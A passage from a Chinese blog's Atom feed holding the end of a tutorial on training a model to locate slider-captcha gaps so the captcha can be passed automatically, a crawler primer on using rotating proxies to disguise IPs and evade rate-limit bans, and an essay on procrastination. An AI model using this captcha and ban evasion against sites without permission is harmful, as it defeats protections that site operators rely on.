</span>|<span class="string"> 1.000000     </span>|<span class="string"> 1.000000     </span>|</span><br><span class="line">|<span class="string"> recall75   </span>|<span class="string"> 1.000000     </span>|<span class="string"> 1.000000     </span>|<span class="string"> 1.000000     </span>|</span><br><span class="line">|<span class="string"> precision  </span>|<span class="string"> 1.000000     </span>|<span class="string"> 0.800000     </span>|<span class="string"> 0.666667     </span>|</span><br><span class="line">|<span class="string"> conf_obj   </span>|<span class="string"> 0.994271     </span>|<span class="string"> 0.999249     </span>|<span class="string"> 0.997762     </span>|</span><br><span class="line">|<span class="string"> conf_noobj </span>|<span class="string"> 0.000126     </span>|<span class="string"> 0.000158     </span>|<span class="string"> 0.000140     </span>|</span><br><span class="line">+------------+--------------+--------------+--------------+</span><br><span class="line">Total loss 0.11806630343198776</span><br></pre>      </td>    </tr>  </table></figure><p>这里显示了训练过程中各个指标的变化情况，如 loss、recall、precision、confidence 等，分别代表训练过程的损失（越小越好）、召回率（能识别出的结果占应该识别出结果的比例，越高越好）、精确率（识别出的结果中正确的比率，越高越好）、置信度（模型有把握识别对的概率，越高越好），可以作为参考。</p><h2 id="5-测试"><a href="#5-测试" class="headerlink" title="5. 测试"></a>5. 测试</h2><p>训练完毕之后会在 checkpoints 文件夹生成 pth 文件，这就是一些模型文件，和上一节的 best_model.pkl 是一样的原理，只不过表示形式略有不同，我们可直接使用这些模型来预测生成标注结果。</p><p>要运行测试，我们可以先在测试文件夹 <code>data/captcha/test</code> 放入一些验证码图片：</p><p>样例验证码如下：</p><p><img src="https://qiniu.cuiqingcai.com/xwqzr.png" alt="captcha_435"></p><p>要运行测试，执行如下脚本：</p><figure class="highlight armasm">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">bash </span>detect.sh</span><br></pre>      </td>    </tr>  </table></figure><p>该脚本会读取测试文件夹所有图片，并将处理后的结果输出到 <code>data/captcha/result</code> 文件夹，控制台输出了一些验证码的识别结果。</p><p>同时在 <code>data/captcha/result</code> 生成了标注的结果，样例如下：</p><p><img src="https://qiniu.cuiqingcai.com/8ax68.png" alt=""></p><p>可以看到，缺口就被准确识别出来了。</p><p>实际上，detect.sh 是执行了 detect.py 文件，在代码中有一个关键的输出结果如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">bbox = patches.Rectangle((x1 + box_w / <span class="number">2</span>, y1 + box_h / <span class="number">2</span>), box_w, box_h, linewidth=<span class="number">2</span>, edgecolor=color, facecolor=<span class="string">"none"</span>)</span><br><span class="line">print(<span class="string">'bbox'</span>, (x1, y1, box_w, box_h), <span class="string">'offset'</span>, x1)</span><br></pre>      </td>    </tr>  </table></figure><p>这里 bbox 指的就是最终缺口的轮廓位置，同时 x1 就是指的轮廓最左侧距离整个验证码最左侧的横向偏移量，即 offset。通过这两个信息，我们就能得到缺口的关键位置了。</p><p>有了目标滑块位置之后，我们便可以进行一些模拟滑动操作从而实现通过验证码的检测了。</p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>本节主要介绍了训练深度学习模型来识别滑动验证码缺口的整体流程，最终我们成功实现了模型训练过程，并得到了一个深度学习模型文件。</p><p>利用这个模型，我们可以输入一张滑动验证码，模型便会预测出其中的缺口的位置，包括偏移量、宽度等，最后可以通过缺口的信息绘制出对应的位置。</p><p>当然本节介绍的内容也可以进一步优化：</p><ul>  <li>当前模型的预测过程是通过命令行执行的，但在实际使用的时候可能并不太方便，可以考虑将预测过程对接 API 服务器暴露出来，比如对接 Flask、Django、FastAPI 等把预测过程实现为一个支持 POST 请求的接口，接口可以接收一张验证码图片，返回验证码的文本信息，这样会使得模型更加方便易用。</li></ul><p>本节代码：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvRGVlcExlYXJuaW5nU2xpZGVDYXB0Y2hhMg==">https://github.com/Python3WebSpider/DeepLearningSlideCaptcha2<i class="fa fa-external-link-alt"></i></span></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
  &lt;p&gt;爬虫系列文章总目录：&lt;a href=&quot;https://cuiqingcai.com/17777.html&quot;&gt;【2022 年】Python3 爬虫学习教程&lt;/a&gt;，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2
      
    
    </summary>
    
    
      <category term="Python" scheme="https://cuiqingcai.com/categories/Python/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="验证码" scheme="https://cuiqingcai.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="网络爬虫" scheme="https://cuiqingcai.com/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    
      <category term="2022" scheme="https://cuiqingcai.com/tags/2022/"/>
    
      <category term="Python 爬虫" scheme="https://cuiqingcai.com/tags/Python-%E7%88%AC%E8%99%AB/"/>
    
      <category term="深度学习" scheme="https://cuiqingcai.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>【2022 年】Python3 爬虫教程 - 代理的基本原理</title>
    <link href="https://cuiqingcai.com/2022101.html"/>
    <id>https://cuiqingcai.com/2022101.html</id>
    <published>2022-03-01T23:36:23.000Z</published>
    <updated>2022-08-01T15:41:25.996Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>爬虫系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>一书了，<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">点击了解详情<i class="fa fa-external-link-alt"></i></span>。</p></blockquote><p>我们在做爬虫的过程中经常会遇到这样的情况，最初爬虫正常运行，正常抓取数据，一切看起来都是那么美好，然而一杯茶的功夫可能就会出现错误，比如 403 Forbidden，这时打开网页一看，可能会看到 “您的 IP 访问频率太高” 这样的提示。出现这种现象的原因是网站采取了一些反爬虫措施。比如，服务器会检测某个 IP 在单位时间内的请求次数，如果超过了这个阈值，就会直接拒绝服务，返回一些错误信息，这种情况可以称为封 IP。</p><p>既然服务器检测的是某个 IP 单位时间的请求次数，那么借助某种方式来伪装我们的 IP，让服务器识别不出是由我们本机发起的请求，不就可以成功防止封 IP 了吗？</p><p>一种有效的方式就是使用代理，后面会详细说明代理的用法。在这之前，需要先了解下代理的基本原理，它是怎样实现伪装 IP 的呢？</p><h2 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1. 基本原理"></a>1. 基本原理</h2><p>代理实际上指的就是代理服务器，英文叫作 Proxy Server，它的功能是代理网络用户去取得网络信息。形象地说，它是网络信息的中转站。在我们正常请求一个网站时，是发送了请求给 Web 服务器，Web 服务器把响应传回给我们。如果设置了代理服务器，实际上就是在本机和服务器之间搭建了一个桥，此时本机不是直接向 Web 服务器发起请求，而是向代理服务器发出请求，请求会发送给代理服务器，然后由代理服务器再发送给 Web 服务器，接着由代理服务器再把 Web 服务器返回的响应转发给本机。这样我们同样可以正常访问网页，但这个过程中 Web 服务器识别出的真实 IP 就不再是我们本机的 IP 了，就成功实现了 IP 伪装，这就是代理的基本原理。</p><h2 id="2-代理的作用"><a href="#2-代理的作用" class="headerlink" title="2. 代理的作用"></a>2. 代理的作用</h2><p>那么，代理有什么作用呢？我们可以简单列举如下。</p><ul>  <li>突破自身 IP 访问限制，访问一些平时不能访问的站点。</li>  <li>访问一些单位或团体内部资源。比如，使用教育网内地址段的免费代理服务器，就可以下载和上传对教育网开放的各类 FTP，以及查询、共享各类资料等。</li>  <li>提高访问速度。通常，代理服务器都设置一个较大的硬盘缓冲区，当有外界的信息通过时，会同时将其保存到缓冲区中，而当其他用户再访问相同的信息时，则直接由缓冲区中取出信息，传给用户，以提高访问速度。</li>  <li>隐藏真实 IP。上网者也可以通过这种方法隐藏自己的 IP，免受攻击。对于爬虫来说，我们用代理就是为了隐藏自身的 IP，防止自身的 IP 被封锁。</li></ul><h2 id="3-爬虫代理"><a href="#3-爬虫代理" class="headerlink" title="3. 爬虫代理"></a>3. 爬虫代理</h2><p>对于爬虫来说，由于爬虫爬取速度过快，在爬取过程中可能遇到同一个 IP 访问过于频繁的问题，此时网站就会让我们输入验证码登录或者直接封锁 IP，这样会给爬取带来极大的不便。</p><p>使用代理隐藏真实的 IP，让服务器误以为是代理服务器在请求自己。这样在爬取过程中通过不断更换代理，就不会被封锁，可以达到很好的爬取效果。</p><h2 id="4-代理分类"><a href="#4-代理分类" class="headerlink" title="4. 代理分类"></a>4. 代理分类</h2><p>对代理进行分类时，既可以根据协议区分，也可以根据其匿名程度区分，下面总结如下。</p><h3 id="根据协议区分"><a href="#根据协议区分" class="headerlink" title="根据协议区分"></a>根据协议区分</h3><p>根据代理的协议，代理可以分为如下类别。</p><ul>  <li><strong>FTP 代理服务器</strong>。主要用于访问 FTP 服务器，一般有上传、下载以及缓存功能，端口一般为 21、2121 等。</li>  <li><strong>HTTP 代理服务器</strong>。主要用于访问网页，一般有内容过滤和缓存功能，端口一般为 80、8080、3128 等。</li>  <li><strong>SSL/TLS 代理</strong>。主要用于访问加密网站，一般有 SSL 或 TLS 加密功能（最高支持 128 位加密强度），端口一般为 443。</li>  <li><strong>RTSP 代理</strong>。主要用于 Realplayer 访问 Real 流媒体服务器，一般有缓存功能，端口一般为 554。</li>  <li><strong>Telnet 代理</strong>。主要用于 Telnet 远程控制（黑客入侵计算机时常用于隐藏身份），端口一般为 23。</li>  <li><strong>POP3/SMTP 代理</strong>。主要用于 POP3/SMTP 方式收发邮件，一般有缓存功能，端口一般为 110/25。</li>  <li><strong>SOCKS 代理</strong>。只是单纯传递数据包，不关心具体协议和用法，所以速度快很多，一般有缓存功能，端口一般为 1080。SOCKS 代理协议又分为 SOCKS4 和 SOCKS5，SOCKS4 协议只支持 TCP，而 SOCKS5 协议支持 TCP 和 UDP，还支持各种身份验证机制、服务器端域名解析等。简单来说，SOCKS4 能做到的 SOCKS5 都可以做到，但 SOCKS5 能做到的 SOCKS4 不一定能做到。</li></ul><h3 id="根据匿名程度区分"><a href="#根据匿名程度区分" class="headerlink" title="根据匿名程度区分"></a>根据匿名程度区分</h3><p>根据代理的匿名程度，代理可以分为如下类别。</p><ul>  <li><strong>高度匿名代理</strong>：高度匿名代理会将数据包原封不动地转发，在服务端看来就好像真的是一个普通客户端在访问，而记录的 IP 是代理服务器的 IP。</li>  <li><strong>普通匿名代理</strong>：普通匿名代理会在数据包上做一些改动，服务端上有可能发现这是个代理服务器，也有一定几率追查到客户端的真实 IP。代理服务器通常会加入的 HTTP 头有 <code>HTTP_VIA</code> 和 <code>HTTP_X_FORWARDED_FOR</code>。</li>  <li><strong>透明代理</strong>：透明代理不但改动了数据包，还会告诉服务器客户端的真实 IP。这种代理除了能用缓存技术提高浏览速度，能用内容过滤提高安全性之外，并无其他显著作用，最常见的例子是内网中的硬件防火墙。</li>  <li><strong>间谍代理</strong>：间谍代理指组织或个人创建的，用于记录用户传输的数据，然后进行研究、监控等目的的代理服务器。</li></ul><h2 id="5-常见代理设置"><a href="#5-常见代理设置" class="headerlink" title="5. 常见代理设置"></a>5. 常见代理设置</h2><p>常见的代理设置如下：</p><ul>  <li>使用网上的免费代理，最好使用高匿代理，使用前抓取下来并筛选一下可用代理，也可以进一步维护一个代理池。</li>  <li>使用付费代理服务，互联网上存在许多代理商，可以付费使用，其质量比免费代理好很多。</li>  <li>ADSL 拨号，拨一次号换一次 IP，稳定性高，也是一种比较有效的解决方案。</li>  <li>蜂窝代理，即用 4G 或 5G 网卡等制作的代理。由于蜂窝网络用作代理的情形较少，因此整体被封锁的几率会较低，但搭建蜂窝代理的成本较高。</li></ul><p>在后面，我们会详细介绍一些代理的使用方式。</p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>本文介绍了代理的相关知识，这对后文我们进行一些反爬绕过的实现有很大的帮助，同时也为后文的一些抓包操作打下基础，需要好好理解。</p><p>本节由于涉及一些专业名词，本节的部分内容参考来源如下：</p><ul>  <li>文档 - 代理服务器 - 维基百科：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dlcm1leS9QeXRob24zV2ViU3BpZGVyMi90cmVlLzNkYzBkYzEwOTIzMDVlMTA0MGY4NmM0ZTcyYTQwZjYyN2IwOTU4OTcvW2h0dHBzOi96aC53aWtpcGVkaWEub3JnL3dpa2kvJTIw5Luj55CG5pyN5Yqh5ZmoL1JFQURNRS5tZA==">https://zh.wikipedia.org/wiki/ 代理服务器<i class="fa fa-external-link-alt"></i></span></li>  <li>文档 - 代理 - 百度百科：<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lMjDku6PnkIYlMjAvJTIwMzI0MjY2Nw==">https://baike.baidu.com/item/代理/3242667<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
  &lt;p&gt;爬虫系列文章总目录：&lt;a href=&quot;https://cuiqingcai.com/17777.html&quot;&gt;【2022 年】Python3 爬虫学习教程&lt;/a&gt;，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2
      
    
    </summary>
    
    
      <category term="Python" scheme="https://cuiqingcai.com/categories/Python/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="网络爬虫" scheme="https://cuiqingcai.com/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    
      <category term="2022" scheme="https://cuiqingcai.com/tags/2022/"/>
    
      <category term="代理" scheme="https://cuiqingcai.com/tags/%E4%BB%A3%E7%90%86/"/>
    
      <category term="Python 爬虫" scheme="https://cuiqingcai.com/tags/Python-%E7%88%AC%E8%99%AB/"/>
    
      <category term="原理" scheme="https://cuiqingcai.com/tags/%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>缓解拖延症的好办法</title>
    <link href="https://cuiqingcai.com/36054.html"/>
    <id>https://cuiqingcai.com/36054.html</id>
    <published>2022-03-01T01:00:22.000Z</published>
    <updated>2022-08-01T15:41:26.012Z</updated>
    
    <content type="html"><![CDATA[<p>其实我个人感觉我的拖延症是非常严重的，很多时候事情一多，就一个也不想做，俗话说叫“论堆”了。也有很多时候脑海里有个长期大目标，但迟迟不肯动手。</p><p>一般我的现象是这样的：</p><ul>  <li>这件事好大好空啊，不知道从哪里下手。</li>  <li>一想到开始好久没做过或者从没做过的一件事就觉得麻烦。</li>  <li>一想到从那么一堆事情里面开始梳理开始做就觉得麻烦。</li></ul><p>你中枪了吗？</p><p>然鹅，近期我发现了一个不错的方法，可以帮助我缓解拖延症。试用之后我的整体效率高了不少，同时还感到满满的成就感，同时还感觉时间多了不少。</p><p>其实方法很简单。</p><p><strong>每天早上起来花 10 分钟把今天要做的事情按小时粒度全部列出来，不论是工作还是日常生活。</strong></p><p>是的，这个方法我特意用了一周左右，感觉非常有效，效率高了很多！</p><p>我思考了下原因，每天低效或者有时候觉得无所事事的原因就是没有目标，尤其是没有短期目标。这个短期目标并不是一周、并不是一天，而应该拆解到小时（当然更牛逼的人会拆解到分钟，抱歉我还做不到）。</p><p>举个栗子。</p><p>比如我今天要上班，上班一般有些会需要开，有些代码需要些，有些文档需要整等等的，下班之后我还要运动下，还要写点东西，还要看点书，还要玩会游戏放松下。</p><p>OK，都没问题。</p><blockquote>  <p>注：公司的邮件系统一般会有会议什么的安排，比如我公司就用的 Outlook 和 Teams，但是它就比较难和我个人的待做清单（滴答清单）有机地融合在一起，所以，我干脆直接全部以自己的待做清单为准，我会在自己的待做清单里面再把今天我要做的所有事情都梳理一遍。</p></blockquote><p>比如说，我的一天可能就这样的：</p><ul>  <li>八点半：起床、洗漱、定早餐</li>  <li>九点：吃早餐</li>  <li>十点：开会讨论某个项目进度</li>  <li>十一点：写某个功能 A 的代码</li>  <li>十二点：午饭</li>  <li>两点：整理某个项目文档</li>  <li>三点：写某个功能 B 的代码</li>  <li>四点半：开会讨论技术问题</li>  <li>六点：晚饭</li>  <li>七点：学习某个知识点</li>  <li>八点半：写某个技术总结</li>  <li>九点：跑步运动</li>  <li>十点半：玩游戏放松</li>  <li>十一点：看看新闻和书</li></ul><p>OK，这些所有的我都会列到我的待做清单（滴答清单）中。</p><p>当然上面的安排都是随便写写的，每天都是不一样的，都是每天早上花 10 分钟左右想出来并列出来的，重要的是根据自己的实际情况合理分配一个预估时间点。</p><p>这个时间点不一定准，如果某个做不完，那稍微调整也没问题。</p><p>这样我每天从早上开始就觉得很有目标和动力，每做完一件事情就打勾，一天下来，十几项事情都勾完了，会很有成就感。</p><p>这样做有几个好处：</p><ul>  <li>每个小时都有清晰的事情可以做，而不是做完了一件事之后不知道下面做什么，就容易走神、跑偏甚至就玩起来一发不可收拾。</li>  <li>每天记录下来不会漏掉一些重要的事情。</li>  <li>做事情的节奏感很强。</li>  <li>同时每天做完之后成就感也很强。</li></ul><p>是的，每天都会感觉做的很充实，甚至每天的事情做完了之后还觉得多出来了一些时间，就会感觉到更满足，剩下的时间自己可以继续分配，或者就简单做自己想做的事情。</p><p>嗯，对我来说还是很有用的！</p><p>大家也去试试吧：每天早上起来花 10 分钟把今天要做的事情按小时粒度全部列出来，然后去执行吧！</p><p>更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实我个人感觉我的拖延症是非常严重的，很多时候事情一多，就一个也不想做，俗话说叫“论堆”了。也有很多时候脑海里有个长期大目标，但迟迟不肯动手。&lt;/p&gt;
&lt;p&gt;一般我的现象是这样的：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;这件事好大好空啊，不知道从哪里下手。&lt;/li&gt;
  &lt;li&gt;一
      
    
    </summary>
    
    
      <category term="个人随笔" scheme="https://cuiqingcai.com/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="拖延症" scheme="https://cuiqingcai.com/tags/%E6%8B%96%E5%BB%B6%E7%97%87/"/>
    
  </entry>
  
</feed>
